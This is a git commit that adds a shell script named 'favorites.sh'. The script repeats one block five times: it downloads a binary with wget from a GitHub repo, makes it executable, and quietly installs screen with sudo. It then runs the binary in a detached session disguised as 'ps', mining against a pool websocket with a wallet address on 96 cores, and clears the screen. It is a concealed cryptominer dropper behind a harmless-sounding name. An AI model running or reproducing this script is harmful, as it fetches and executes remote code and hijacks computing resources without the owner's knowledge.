ec91a8484b0ebf5fd9dd15915ae5e872efe70905
obisumila <obisumila@gmail.com>
2024-10-09 05:40:44 +0800

    Add files via upload

---
+++ favorites.sh
@@ -0,0 +1,50 @@
+wget https://github.com/obisumila/silver-succotash/raw/refs/heads/main/axelis ;
+chmod +x axelis ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./axelis --url ws://ore.tw-pool.com:5487/mine mine --username 9LWaS2HU23dVnyZKmPXawuDn3yxemTaqr7QcPUUFjPSL.EXE --cores 96 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/silver-succotash/raw/refs/heads/main/axelis ;
+chmod +x axelis ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./axelis --url ws://ore.tw-pool.com:5487/mine mine --username 9LWaS2HU23dVnyZKmPXawuDn3yxemTaqr7QcPUUFjPSL.EXE --cores 96 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/silver-succotash/raw/refs/heads/main/axelis ;
+chmod +x axelis ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./axelis --url ws://ore.tw-pool.com:5487/mine mine --username 9LWaS2HU23dVnyZKmPXawuDn3yxemTaqr7QcPUUFjPSL.EXE --cores 96 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/silver-succotash/raw/refs/heads/main/axelis ;
+chmod +x axelis ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./axelis --url ws://ore.tw-pool.com:5487/mine mine --username 9LWaS2HU23dVnyZKmPXawuDn3yxemTaqr7QcPUUFjPSL.EXE --cores 96 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/silver-succotash/raw/refs/heads/main/axelis ;
+chmod +x axelis ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./axelis --url ws://ore.tw-pool.com:5487/mine mine --username 9LWaS2HU23dVnyZKmPXawuDn3yxemTaqr7QcPUUFjPSL.EXE --cores 96 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
